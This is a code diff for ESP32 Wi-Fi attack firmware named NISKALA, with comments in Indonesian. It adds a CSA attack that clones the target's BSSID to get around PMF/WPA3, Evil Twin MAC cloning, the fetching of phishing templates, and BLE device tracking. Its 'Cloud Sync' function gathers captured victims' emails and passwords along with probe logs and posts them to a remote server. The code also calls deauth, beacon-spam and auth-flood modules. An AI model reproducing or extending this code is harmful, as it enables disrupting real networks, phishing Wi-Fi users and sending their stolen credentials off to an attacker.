+  if (WiFi.getMode() != WIFI_AP_STA) WiFi.mode(WIFI_AP_STA);
+  uint8_t mac[6]; esp_wifi_get_mac(WIFI_IF_AP, mac);
+  if (memcmp(mac, g_targetBSSID, 6) != 0) {
+    esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID);
+    if (macErr != ESP_OK) {
+      Serial.printf("[WARN] CSA set_mac failed (%d)\n", macErr);
+    }
+    delay(50);
+  }
+  WiFi.softAP("CSA_Init", "12345678", 1, 1); delay(300);
+  applyPromiscuousFilter(false);
+  esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_channel(g_targetChannel, WIFI_SECOND_CHAN_NONE);
+  delay(100);
+
+  strncpy(g_csaTargetSSID, targetSSID.c_str(), 32);
+  g_csaTargetSSID[32] = 0;
+
+  g_packetsSent = 0;
+  g_txErrors = 0;
+  g_victimFound = false;
+  isCSARunning = true;
+  g_attackMode = ATK_CSA;
+  Serial.printf("[CSA] Started on BSSID %02X:%02X:%02X:%02X:%02X:%02X ch=%d SSID=%s\n",
+                g_targetBSSID[0], g_targetBSSID[1], g_targetBSSID[2],
+                g_targetBSSID[3], g_targetBSSID[4], g_targetBSSID[5],
+                g_targetChannel, g_csaTargetSSID);
+}
+
+void stopCSAAttack() {
+  isCSARunning = false;
+  g_attackMode = ATK_IDLE;
+  esp_wifi_set_promiscuous(false);
+  WiFi.mode(WIFI_STA);
+  Serial.println("[CSA] Stopped");
+}
+
+// ── Web Remote ──
+void drawWebRemoteScreen() {
+  tft.fillScreen(TFT_BLACK);
+  drawHeader("WEB REMOTE", TFT_DARKGREEN);
+  tft.setTextFont(2);
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setCursor(10, 28); tft.print("SSID: ");
+  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.println("NISKALA_CTRL");
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setCursor(10, 48); tft.print("Pass: ");
+  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.println("niskala123");
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setCursor(10, 68); tft.print("URL : ");
+  tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.println("192.168.4.1");
+  tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
+  tft.setCursor(10, 90); tft.print("BAT:"); tft.print(readBatteryPercent());
+  tft.print("% T:"); tft.print((int)temperatureRead()); tft.print("C H:"); tft.print(ESP.getFreeHeap());
+  drawFooter("TOMBOL = STOP & KEMBALI");
+}
+
+void startWebRemote() {
+  WiFi.mode(WIFI_AP_STA);
+  delay(200);
+  WiFi.softAP("NISKALA_CTRL", "niskala123", 1, 0, 4);
+  delay(300);
+  server.begin();
+  dnsServer.start(53, "*", WiFi.softAPIP());
+  isWebRemoteRunning = true;
+  Serial.println("[WEB] Remote control aktif");
+  drawWebRemoteScreen();
+}
+
+void stopWebRemote() {
+  server.stop();
+  dnsServer.stop();
+  WiFi.mode(WIFI_STA);
+  isWebRemoteRunning = false;
+  Serial.println("[WEB] Remote control berhenti");
+}
+
+void drawOtaScreen() {
+  tft.fillScreen(TFT_BLACK);
+  drawHeader("OTA UPDATE", TFT_DARKCYAN);
+  tft.setTextFont(2);
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setCursor(10, 30); tft.print("SSID: ");
+  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.println("NISKALA_OTA");
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setCursor(10, 52); tft.print("Pass: ");
+  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.println("niskala123");
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setCursor(10, 74); tft.print("IP  : ");
+  tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.println("192.168.4.1");
+  tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
+  tft.setCursor(10, 96); tft.print("pio run -e ota -t upload");
+  drawFooter("TOMBOL = KELUAR");
+}
+
+void startOTA() {
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP("NISKALA_OTA", "niskala123", 1, 0, 1);
+  delay(300);
+  ArduinoOTA.setHostname("niskala");
+  ArduinoOTA.onStart([]() { Serial.println("[OTA] Start"); });
+  ArduinoOTA.onEnd([]() { Serial.println("[OTA] End"); });
+  ArduinoOTA.onError([](ota_error_t error) { Serial.printf("[OTA] Error %u\n", error); });
+  ArduinoOTA.begin();
+  isOtaRunning = true;
+  drawOtaScreen();
+  Serial.println("[OTA] Aktif di 192.168.4.1");
+}
+
+void stopOTA() {
+  isOtaRunning = false;
+  WiFi.mode(WIFI_STA);
+  Serial.println("[OTA] Berhenti");
+}
+
+// ------------------------------------------------------------------
+// BLE Scanner & MAC Tracking
+// ------------------------------------------------------------------
+class BleScanCallbacks : public BLEAdvertisedDeviceCallbacks {
+  void onResult(BLEAdvertisedDevice d) {
+    String mac = String(d.getAddress().toString().c_str());
+    int8_t rssi = d.getRSSI();
+    String name = d.haveName() ? String(d.getName().c_str()) : String("");
+
+    for (int i = 0; i < g_bleScanCount; i++) {
+      if (strcmp(g_bleScanLog[i].mac, mac.c_str()) == 0) {
+        g_bleScanLog[i].rssi = rssi;
+        g_bleScanLog[i].lastSeen = millis();
+        if (name.length() > 0) {
+          strncpy(g_bleScanLog[i].name, name.c_str(), 32);
+          g_bleScanLog[i].name[32] = 0;
+        }
+        return;
+      }
+    }
+    if (g_bleScanCount < BLE_SCAN_MAX) {
+      BleScanEntry* e = &g_bleScanLog[g_bleScanCount];
+      strncpy(e->mac, mac.c_str(), 17);
+      e->mac[17] = 0;
+      strncpy(e->name, name.c_str(), 32);
+      e->name[32] = 0;
+      e->rssi = rssi;
+      e->lastSeen = millis();
+      e->used = true;
+      g_bleScanCount++;
+    }
+  }
+};
+
+BLEScan* g_bleScan = nullptr;
+
+void drawBleScan() {
+  tft.fillScreen(TFT_BLACK);
+  drawHeader("BLE SCANNER", TFT_BLUE);
+  tft.setTextFont(1);
+  tft.setTextColor(TFT_CYAN, TFT_BLACK);
+  tft.setCursor(4, 28);
+  tft.print("MAC               RSSI  NAME");
+
+  int shown = 0;
+  for (int i = 0; i < g_bleScanCount && shown < 4; i++) {
+    tft.setTextColor(TFT_WHITE, TFT_BLACK);
+    tft.setCursor(4, 40 + shown * 18);
+    char buf[64];
+    const char* bname = g_bleScanLog[i].name[0] ? g_bleScanLog[i].name : vendorFromMacStr(g_bleScanLog[i].mac);
+    snprintf(buf, sizeof(buf), "%s  %4d  %s",
+             g_bleScanLog[i].mac, g_bleScanLog[i].rssi, bname);
+    tft.print(buf);
+    shown++;
+  }
+  if (g_bleScanCount == 0) {
+    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
+    tft.setCursor(4, 50);
+    tft.print("Menunggu perangkat BLE...");
+  }
+  tft.setTextColor(TFT_GREEN, TFT_BLACK);
+  tft.setCursor(4, 108);
+  tft.print("Total: " + String(g_bleScanCount));
+  drawFooter("TOMBOL = STOP");
+}
+
+void startBLEScan() {
+  WiFi.mode(WIFI_OFF);
+  if (!BLEDevice::getInitialized()) BLEDevice::init("");
+  g_bleScan = BLEDevice::getScan();
+  g_bleScan->setAdvertisedDeviceCallbacks(new BleScanCallbacks());
+  g_bleScan->setActiveScan(true);
+  g_bleScan->setInterval(100);
+  g_bleScan->setWindow(99);
+  g_bleScanCount = 0;
+  g_bleScanStart = millis();
+  g_bleScan->start(0, false);
+  g_bleScanning = true;
+  Serial.println("[BLE] Scanner aktif");
+  drawBleScan();
+}
+
+void stopBLEScan() {
+  if (g_bleScan) g_bleScan->stop();
+  g_bleScanning = false;
+  BLEDevice::deinit(true);
+  WiFi.mode(WIFI_STA);
+  Serial.println("[BLE] Scanner berhenti");
+}
+
+// ------------------------------------------------------------------
+// Cloud Sync (kirim hasil ke hosting)
+// ------------------------------------------------------------------
+String buildSyncJson() {
+  String mac = WiFi.macAddress();
+  String j = "{\"device\":\"NISKALA\",\"mac\":\"" + mac + "\",\"uptime\":" + String(millis() / 1000) + ",";
+
+  // probe log
+  j += "\"probe\":[";
+  portENTER_CRITICAL(&g_probeLogMux);
+  int cnt = g_probeLogCount;
+  int head = g_probeLogHead;
+  ProbeEntry snap[PROBE_LOG_SIZE];
+  for (int i = 0; i < cnt; i++) {
+    int idx = (head - cnt + i + PROBE_LOG_SIZE) % PROBE_LOG_SIZE;
+    snap[i] = g_probeLog[idx];
+  }
+  portEXIT_CRITICAL(&g_probeLogMux);
+  for (int i = 0; i < cnt; i++) {
+    if (i) j += ",";
+    char m[18];
+    snprintf(m, sizeof(m), "%02X:%02X:%02X:%02X:%02X:%02X",
+             snap[i].mac[0], snap[i].mac[1], snap[i].mac[2],
+             snap[i].mac[3], snap[i].mac[4], snap[i].mac[5]);
+    String ssid = snap[i].ssid[0] ? String(snap[i].ssid) : String("(hidden)");
+    j += "{\"mac\":\"" + String(m) + "\",\"rssi\":" + String(snap[i].rssi) + ",\"ssid\":\"" + jsonEscape(ssid) + "\"}";
+  }
+  j += "],";
+
+  // karma
+  j += "\"karma\":[";
+  for (int i = 0; i < g_karmaSSIDCount; i++) {
+    if (i) j += ",";
+    j += "{\"ssid\":\"" + jsonEscape(String(g_karmaSSIDs[i].ssid)) + "\",\"probe_count\":" + String(g_karmaSSIDs[i].probeCount) + ",\"auth_count\":" + String(g_karmaSSIDs[i].authCount) + "}";
+  }
+  j += "],";
+
+  // passwords
+  int total = prefs.getInt("pwd_count", 0);
+  j += "\"passwords\":[";
+  for (int i = 0; i < total; i++) {
+    String entry = prefs.getString(("pwd_" + String(i)).c_str(), "");
+    int p1 = entry.indexOf('|');
+    String email = (p1 > 0) ? entry.substring(0, p1) : entry;
+    String rest = (p1 > 0) ? entry.substring(p1 + 1) : "";
+    int p2 = rest.indexOf('|');
+    String pass = (p2 > 0) ? rest.substring(0, p2) : rest;
+    String ver = (p2 > 0) ? rest.substring(p2 + 1) : "";
+    if (i) j += ",";
+    j += "{\"email\":\"" + jsonEscape(email) + "\",\"password\":\"" + jsonEscape(pass) + "\",\"verified\":\"" + ver + "\"}";
+  }
+  j += "],\"ble\":[\n";
+  for (int i = 0; i < g_bleScanCount; i++) {
+    if (i) j += ",";
+    j += "{\"mac\":\"" + String(g_bleScanLog[i].mac) + "\",\"name\":\"" + jsonEscape(String(g_bleScanLog[i].name)) + "\",\"rssi\":" + String(g_bleScanLog[i].rssi) + "}";
+  }
+  j += "]}";
+  return j;
+}
+
+void startCloudSync() {
+  tft.fillScreen(TFT_BLACK);
+  drawHeader("CLOUD SYNC", TFT_DARKCYAN);
+  tft.setTextFont(2);
+
+  if (cfg_wifi_ssid.length() == 0 || cfg_server_url.length() == 0) {
+    tft.setTextColor(TFT_RED, TFT_BLACK);
+    tft.setCursor(10, 40); tft.println("Belum dikonfigurasi.");
+    tft.setCursor(10, 60); tft.println("Isi WiFi & URL di");
+    tft.setCursor(10, 80); tft.println("Web Remote > Config.");
+    delay(2500);
+    currentState = MAIN_MENU;
+    drawMainMenu();
+    return;
+  }
+
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setCursor(10, 40); tft.print("WiFi: "); tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.println(cfg_wifi_ssid.substring(0, 16));
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setCursor(10, 60); tft.print("URL : "); tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.println(cfg_server_url.substring(0, 30));
+  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
+  tft.setCursor(10, 85); tft.print("Menghubungkan...");
+
+  WiFi.mode(WIFI_STA);
+  WiFi.begin(cfg_wifi_ssid.c_str(), cfg_wifi_pass.c_str());
+  unsigned long t = millis();
+  while (WiFi.status() != WL_CONNECTED && millis() - t < 12000) {
+    delay(200);
+  }
+  if (WiFi.status() != WL_CONNECTED) {
+    tft.setTextColor(TFT_RED, TFT_BLACK);
+    tft.setCursor(10, 105); tft.println("GAGAL konek WiFi");
+    delay(2000);
+    currentState = MAIN_MENU;
+    drawMainMenu();
+    return;
+  }
+
+  tft.setTextColor(TFT_GREEN, TFT_BLACK);
+  tft.setCursor(10, 105); tft.print("Connected. Mengirim...");
+
+  String json = buildSyncJson();
+  HTTPClient http;
+  http.begin(cfg_server_url);
+  http.addHeader("Content-Type", "application/json");
+  http.addHeader("X-API-Key", SYNC_API_KEY);
+  int code = http.POST(json);
+  String resp = http.getString();
+  http.end();
+
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.fillRect(0, 105, 240, 12, TFT_BLACK);
+  tft.setCursor(10, 105);
+  if (code == 200) { tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.println("SUKSES kirim data"); }
+  else { tft.setTextColor(TFT_RED, TFT_BLACK); tft.println("FAIL HTTP " + String(code)); }
+
+  WiFi.disconnect();
+  WiFi.mode(WIFI_STA);
+  delay(2500);
+  currentState = MAIN_MENU;
+  drawMainMenu();
+}
+
+void stopEvilTwin();
+
+// Hentikan semua modul serangan tanpa merusak AP kontrol saat idle
+void stopAllAttacks() {
+  if (isDeauthRunning) stopDeauthEngine();
+  if (isBeaconRunning) stopBeaconSpam();
+  if (isAuthFloodRunning) stopAuthFlood();
+  if (isGlobalDeauthRunning) stopGlobalDeauth();
+  if (isProbeRunning) stopProbeSniffer();
+  if (isBTSpamRunning) stopBTSpam();
+  if (isCSARunning) stopCSAAttack();
+  if (isKarmaRunning) stopKarmaScan();
+  if (isEvilTwinRunning) {
+    isEvilTwinRunning = false;
+    isReleasing = false;
+    isVerifying = false;
+    verifyState = 0;
+    verifyAttempts = 0;
+    server.stop();
+    dnsServer.stop();
+    esp_wifi_set_promiscuous(false);
+    WiFi.mode(WIFI_STA);
+  }
+  g_attackMode = ATK_IDLE;
+}
+
+// ── Evil Twin  [PATCH 5 MAC cloning] ──
 void stopEvilTwin();
 
 void startEvilTwinWithDeauth() {
   WiFi.mode(WIFI_AP_STA);
   delay(200);
 
+  // [PATCH 5] Clone BSSID target ke softAP — agar client auto-reconnect
+  bool bssidValid = false;
+  for (int i = 0; i < 6; i++) {
+    if (g_targetBSSID[i] != 0) { bssidValid = true; break; }
+  }
+  if (bssidValid) {
+    uint8_t curMac[6]; esp_wifi_get_mac(WIFI_IF_AP, curMac);
+    if (memcmp(curMac, g_targetBSSID, 6) != 0) {
+      esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID);
+      if (macErr != ESP_OK) {
+        Serial.printf("[WARN] Evil Twin set_mac failed (%d)\n", macErr);
+      } else {
+        Serial.printf("[EVIL TWIN] BSSID cloned: %02X:%02X:%02X:%02X:%02X:%02X\n",
+                      g_targetBSSID[0], g_targetBSSID[1], g_targetBSSID[2],
+                      g_targetBSSID[3], g_targetBSSID[4], g_targetBSSID[5]);
+      }
+      delay(50);
+    }
+  } else {
+    Serial.println("[EVIL TWIN] BSSID target invalid — skip MAC clone");
+  }
+
   String safeSSID = targetSSID;
   if (safeSSID.length() == 0) safeSSID = "Free_WiFi";
 
-  // JANGAN DI-HIDDEN, karena inti Evil Twin adalah SSID harus terlihat oleh korban.
   bool apSuccess = WiFi.softAP(safeSSID.c_str(), NULL, g_targetChannel, 0, 4);
   if (!apSuccess) {
     Serial.println("[ERROR] Gagal membuat AP Palsu!");
@@ -1110,6 +1761,8 @@ void stopEvilTwin() {
   isEvilTwinRunning = false;
   isReleasing = false;
   isVerifying = false;
+  verifyState = 0;
+  useCustomTemplate = false;
   g_attackMode = ATK_IDLE;
   server.stop();
   dnsServer.stop();
@@ -1120,13 +1773,91 @@ void stopEvilTwin() {
 // ═══════════════════════════════════════════════
 // PMF detection
 // ═══════════════════════════════════════════════
+// ------------------------------------------------------------------
+// Deteksi PMF (802.11w) presisi via parsing RSN capabilities beacon
+// ------------------------------------------------------------------
+volatile bool g_pmfFound = false;
+volatile bool g_pmfEnabled = false;
+uint8_t g_pmfBSSID[6] = {0};
+
+void pmfCaptureCb(void* buf, wifi_promiscuous_pkt_type_t type) {
+  if (type != WIFI_PKT_MGMT) return;
+  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
+  uint8_t* p = pkt->payload;
+  uint16_t sig_len = pkt->rx_ctrl.sig_len;
+  if (sig_len < 24) return;
+
+  uint8_t subtype = (p[0] >> 4) & 0x0F;
+  if (subtype != 0x08) return; // beacon
+  if (memcmp(&p[16], g_pmfBSSID, 6) != 0) return;
+
+  int pos = 36; // 24 header + 12 fixed params
+  while (pos + 2 <= sig_len) {
+    uint8_t eid = p[pos];
+    uint8_t len = p[pos + 1];
+    if (pos + 2 + len > sig_len) break;
+
+    if (eid == 0x30) { // RSN IE
+      int d = pos + 2;
+      int dlen = len;
+      if (dlen >= 8) {
+        uint16_t pcount = p[d + 6] | (p[d + 7] << 8);
+        int off = d + 8 + pcount * 4;
+        if (off + 2 <= d + dlen) {
+          uint16_t acount = p[off] | (p[off + 1] << 8);
+          off += 2 + acount * 4;
+          if (off + 2 <= d + dlen) {
+            uint16_t caps = p[off] | (p[off + 1] << 8);
+            g_pmfEnabled = (caps & 0x00C0) != 0; // bit 6 = capable, bit 7 = required
+            g_pmfFound = true;
+          }
+        }
+      }
+      break;
+    }
+    pos += 2 + len;
+  }
+}
+
+bool detectPMFExact(const uint8_t* bssid, uint8_t channel) {
+  g_pmfFound = false;
+  g_pmfEnabled = false;
+  memcpy(g_pmfBSSID, bssid, 6);
+
+  WiFi.mode(WIFI_AP_STA);
+  delay(50);
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+  delay(50);
+
+  wifi_promiscuous_filter_t filter;
+  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
+  esp_wifi_set_promiscuous_filter(&filter);
+  esp_wifi_set_promiscuous_rx_cb(pmfCaptureCb);
+  esp_wifi_set_promiscuous(true);
+
+  unsigned long start = millis();
+  while (!g_pmfFound && (millis() - start) < 700) {
+    delay(10);
+  }
+
+  esp_wifi_set_promiscuous(false);
+  WiFi.mode(WIFI_STA);
+  return g_pmfEnabled;
+}
+
 bool detectPMF(int idx) {
   wifi_ap_record_t records[32];
   uint16_t count = 32;
   if (esp_wifi_scan_get_ap_records(&count, records) != ESP_OK) return false;
   if (idx >= count) return false;
+
   wifi_auth_mode_t m = records[idx].authmode;
-  return (m == WIFI_AUTH_WPA3_PSK || m == WIFI_AUTH_WPA2_WPA3_PSK);
+  if (m == WIFI_AUTH_WPA3_PSK || m == WIFI_AUTH_WPA2_WPA3_PSK) return true;
+
+  // WPA2 bisa tetap aktif PMF (802.11w) -> deteksi presisi dari beacon RSN
+  uint8_t bssid[6];
+  memcpy(bssid, records[idx].bssid, 6);
+  return detectPMFExact(bssid, records[idx].primary);
 }
 
 // ═══════════════════════════════════════════════
@@ -1135,6 +1866,7 @@ bool detectPMF(int idx) {
 void beginVerification() {
   isReleasing = false;
   isVerifying = true;
+  verifyState = 1;
   verifyStart = millis();
   Serial.printf("[VERIFY] Attempt %d/%d starting\n",
                 verifyAttempts + 1, MAX_VERIFY_ATTEMPTS);
@@ -1176,9 +1908,9 @@ void updateVerification() {
       tft.setCursor(10, 60); tft.println("Target dilepas.");
       tft.setTextColor(TFT_CYAN, TFT_BLACK);
       tft.setCursor(10, 85); tft.println("Kembali ke menu...");
-      delay(2500);
-      currentState = MAIN_MENU;
-      drawMainMenu();
+      transientActive = true;
+      transientUntil = millis() + 2500;
+      transientMode = 1;
       return;
     }
 
@@ -1195,8 +1927,10 @@ void updateVerification() {
     tft.print("/"); tft.println(MAX_VERIFY_ATTEMPTS);
     tft.setTextColor(TFT_GREEN, TFT_BLACK);
     tft.setCursor(10, 85); tft.println("Target input ulang...");
-    delay(1500);
-    drawEvilTwinRunning(0);
+    transientActive = true;
+    transientUntil = millis() + 1500;
+    transientMode = 2;
+    return;
   }
 }
 
@@ -1208,8 +1942,6 @@ void handleAPListNavigation() {
     delay(200);
     selectedIdx++;
     if (selectedIdx > apCount) selectedIdx = 0;
-    if (selectedIdx >= apScrollPos + 4) apScrollPos = selectedIdx - 3;
-    else if (selectedIdx < apScrollPos) apScrollPos = selectedIdx;
     drawAPList();
   }
   if (digitalRead(BTN_BOTTOM) == LOW) {
@@ -1217,22 +1949,44 @@ void handleAPListNavigation() {
     if (selectedIdx == apCount) {
       currentState = MAIN_MENU; drawMainMenu();
     } else {
-      if (detectPMF(selectedIdx)) {
-        tft.fillScreen(TFT_BLACK);
-        drawHeader("TARGET DILINDUNGI PMF", TFT_RED);
-        tft.setTextFont(2); tft.setTextColor(TFT_YELLOW, TFT_BLACK);
-        tft.setCursor(10, 40); tft.println("Target pakai PMF/WPA3.");
-        tft.setCursor(10, 60); tft.println("Deauth TIDAK akan");
-        tft.setCursor(10, 80); tft.println("berhasil.");
-        tft.setTextColor(TFT_CYAN, TFT_BLACK);
-        tft.setCursor(10, 105); tft.println("Pilih AP lain.");
-        delay(2500); drawAPList();
-        return;
-      }
       memcpy(g_targetBSSID, WiFi.BSSID(selectedIdx), 6);
       g_targetChannel = WiFi.channel(selectedIdx);
       targetSSID = WiFi.SSID(selectedIdx);
 
+      if (currentState == AP_LIST_CSA) {
+        currentState = CSA_RUNNING;
+        startCSAAttack();
+        drawCSARunning(0);
+        while (digitalRead(BTN_BOTTOM) == LOW) delay(50);
+        return;
+      }
+      // [PATCH 2] PMF terdeteksi → tawarkan CSA
+      if (detectPMF(selectedIdx)) {
+        tft.fillScreen(TFT_BLACK);
+        drawHeader("TARGET PMF/WPA3", TFT_ORANGE);
+        tft.setTextFont(2); tft.setTextColor(TFT_YELLOW, TFT_BLACK);
+        tft.setCursor(10, 30); tft.println("Target pakai PMF/WPA3.");
+        tft.setCursor(10, 48); tft.println("Deauth TIDAK berhasil.");
+        tft.setTextColor(TFT_GREEN, TFT_BLACK);
+        tft.setCursor(10, 70); tft.println("Gunakan CSA Attack —");
+        tft.setCursor(10, 88); tft.println("tembus PMF via beacon");
+        tft.setCursor(10, 106); tft.println("channel switch sah.");
+        drawFooter("ATAS=Batal | BAWAH=CSA");
+
+        while (digitalRead(BTN_TOP) != LOW && digitalRead(BTN_BOTTOM) != LOW) delay(50);
+        delay(300);
+
+        if (digitalRead(BTN_BOTTOM) == LOW) {
+          currentState = CSA_RUNNING;
+          startCSAAttack();
+          drawCSARunning(0);
+          while (digitalRead(BTN_BOTTOM) == LOW) delay(50);
+        } else {
+          currentState = MAIN_MENU;
+          drawMainMenu();
+        }
+        return;
+      }
       if (currentState == AP_LIST_DEAUTH) {
         currentState = DEAUTH_MENU;
         startDeauthEngine();
@@ -1250,6 +2004,44 @@ void handleAPListNavigation() {
   }
 }
 
+bool fetchCustomTemplate() {
+  if (cfg_template_url.length() == 0 || cfg_wifi_ssid.length() == 0) return false;
+
+  tft.fillScreen(TFT_BLACK);
+  drawHeader("AMBIL TEMPLATE", TFT_DARKCYAN);
+  tft.setTextFont(2);
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setCursor(10, 40); tft.println("Mengambil template");
+  tft.setCursor(10, 60); tft.println("dari hosting...");
+
+  WiFi.mode(WIFI_STA);
+  WiFi.begin(cfg_wifi_ssid.c_str(), cfg_wifi_pass.c_str());
+  unsigned long t = millis();
+  while (WiFi.status() != WL_CONNECTED && millis() - t < 12000) {
+    delay(200);
+  }
+  if (WiFi.status() != WL_CONNECTED) {
+    WiFi.disconnect();
+    WiFi.mode(WIFI_STA);
+    return false;
+  }
+
+  HTTPClient http;
+  http.begin(cfg_template_url);
+  int code = http.GET();
+  if (code == 200) {
+    g_customTemplate = http.getString();
+    http.end();
+    WiFi.disconnect();
+    WiFi.mode(WIFI_STA);
+    return g_customTemplate.length() > 0;
+  }
+  http.end();
+  WiFi.disconnect();
+  WiFi.mode(WIFI_STA);
+  return false;
+}
+
 void handleTemplateSelect() {
   if (digitalRead(BTN_TOP) == LOW) {
     delay(200);
@@ -1258,7 +2050,17 @@ void handleTemplateSelect() {
   }
   if (digitalRead(BTN_BOTTOM) == LOW) {
     delay(200);
-    selectedTemplateIdx = templateSelection;
+    if (templateSelection == 5) {
+      selectedTemplateIdx = 5;
+      useCustomTemplate = true;
+      if (!fetchCustomTemplate()) {
+        useCustomTemplate = false;
+        selectedTemplateIdx = 0;
+      }
+    } else {
+      selectedTemplateIdx = templateSelection;
+      useCustomTemplate = false;
+    }
     currentState = EVIL_TWIN_RUNNING;
     verifyAttempts = 0;
     verifyState = 0;
@@ -1280,7 +2082,6 @@ void handleKarmaResults() {
     delay(200);
 
     if (karmaSelection >= g_karmaSSIDCount) {
-      // BACK
       karmaSelection = 0;
       karmaScrollPos = 0;
       currentState = MAIN_MENU;
@@ -1288,12 +2089,10 @@ void handleKarmaResults() {
       return;
     }
 
-    // Select SSID
     String selectedSSID = String(g_karmaSSIDs[karmaSelection].ssid);
     int probes = g_karmaSSIDs[karmaSelection].probeCount;
     Serial.printf("[KARMA] Selected: %s (%d probes)\n", selectedSSID.c_str(), probes);
 
-    // Tampil loading
     tft.fillScreen(TFT_BLACK);
     drawHeader("MENCARI AP ASLI...", TFT_ORANGE);
     tft.setTextFont(2); tft.setTextColor(TFT_WHITE, TFT_BLACK);
@@ -1303,11 +2102,11 @@ void handleKarmaResults() {
     tft.setTextColor(TFT_YELLOW, TFT_BLACK);
     tft.setCursor(10, 80); tft.println("Scanning...");
 
-    // Cari BSSID + channel dari AP asli (jika ada)
     uint8_t foundBSSID[6] = {0};
     uint8_t foundChannel = 1;
     bool found = false;
 
+    delay(100);
     int n = WiFi.scanNetworks(false, true);
     for (int i = 0; i < n; i++) {
       if (WiFi.SSID(i) == selectedSSID) {
@@ -1331,7 +2130,6 @@ void handleKarmaResults() {
       Serial.printf("[KARMA] AP not found — Evil Twin without deauth target\n");
     }
 
-    // Reset verification state & transition
     verifyAttempts = 0;
     verifyState = 0;
     currentState = EVIL_TWIN_RUNNING;
@@ -1362,7 +2160,7 @@ void doScanAnimation() {
 // ═══════════════════════════════════════════════
 void showDisclaimerFlow() {
   while (true) {
-    drawDisclaimerScreen(tft, "NISKALA");
+    drawDisclaimerScreen(tft, "v" FW_VERSION);
     while (digitalRead(BTN_TOP) != LOW && digitalRead(BTN_BOTTOM) != LOW) delay(50);
     delay(300);
     drawConfirmationScreen(tft);
@@ -1381,19 +2179,34 @@ void showDisclaimerFlow() {
 // ═══════════════════════════════════════════════
 void setup() {
   Serial.begin(115200);
+  randomSeed(esp_random());
   delay(300);
   Serial.println();
-  Serial.println("==== NISKALA v1.0 ====");
+  Serial.println("==== NISKALA v" FW_VERSION " ====");
   Serial.printf("Chip : %s rev %d\n", ESP.getChipModel(), ESP.getChipRevision());
   Serial.printf("Heap : %u bytes\n", ESP.getFreeHeap());
 
   pinMode(BTN_TOP, INPUT_PULLUP);
   pinMode(BTN_BOTTOM, INPUT_PULLUP);
+  analogSetPinAttenuation(BAT_PIN, ADC_11db);
   prefs.begin("deauther", false);
+
+  cfg_deauth_burst = prefs.getInt("cfg_deauth", 5);
+  cfg_auth_burst = prefs.getInt("cfg_auth", 20);
+  cfg_hop_interval_ms = prefs.getInt("cfg_hop", 120);
+  cfg_beacon_hop_ms = prefs.getInt("cfg_beacon", 100);
+  cfg_deauth_reason = prefs.getInt("cfg_reason", 0);
+  { String _s = prefs.getString("wifi_ssid", ""); if (_s.length() > 0) cfg_wifi_ssid = _s; }
+  { String _s = prefs.getString("wifi_pass", ""); if (_s.length() > 0) cfg_wifi_pass = _s; }
+  { String _s = prefs.getString("srv_url", ""); if (_s.length() > 0) cfg_server_url = _s; }
+  { String _s = prefs.getString("tpl_url", ""); if (_s.length() > 0) cfg_template_url = _s; }
+  cfg_autosync_min = prefs.getInt("autosync", 0);
+  lastAutoSync = millis();
 
   server.on("/", handleRoot);
   server.on("/login", HTTP_POST, handleLogin);
   server.onNotFound(handleNotFound);
+  setupWebRemote();
 
   tft.init();
   tft.setRotation(1);
@@ -1426,11 +2239,28 @@ static unsigned long lastUI = 0;
 static int animFrame = 0;
 
 void loop() {
+  // Non-blocking transient info (verification result hold)
+  if (transientActive) {
+    if (transientMode == 2) {
+      dnsServer.processNextRequest();
+      server.handleClient();
+    }
+    if (millis() > transientUntil) {
+      transientActive = false;
+      if (transientMode == 1) {
+        currentState = MAIN_MENU;
+        drawMainMenu();
+      } else {
+        drawEvilTwinRunning(0);
+      }
+    }
+    return;
+  }
+
   // ── KARMA_SCAN ──
   if (currentState == KARMA_SCAN && isKarmaRunning) {
     if (millis() - lastUI > 200) { drawKarmaScan(animFrame++); lastUI = millis(); }
 
-    // Auto-transition setelah 20s
     if (millis() - karmaScanStart > KARMA_SCAN_DURATION_MS) {
       stopKarmaScan();
       sortKarmaSSIDs();
@@ -1441,7 +2271,6 @@ void loop() {
       return;
     }
 
-    // Cancel button
     if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
       delay(300);
       stopKarmaScan();
@@ -1457,7 +2286,7 @@ void loop() {
     return;
   }
 
-  // ── EVIL_TWIN: success state ──
+  // ── EVIL_TWIN: success ──
   if (verifyState == 2 && isEvilTwinRunning) {
     dnsServer.processNextRequest();
     server.handleClient();
@@ -1509,6 +2338,11 @@ void loop() {
     return;
   }
 
+  // ── CSA ──
+  if (currentState == CSA_RUNNING && isCSARunning) {
+    if (millis() - lastUI > 180) { drawCSARunning(animFrame++); lastUI = millis(); }
+  }
+
   // ── Fitur lain ──
   if (currentState == DEAUTH_MENU && isDeauthRunning) {
     if (millis() - lastUI > 200) { drawDeauthMenu(); lastUI = millis(); }
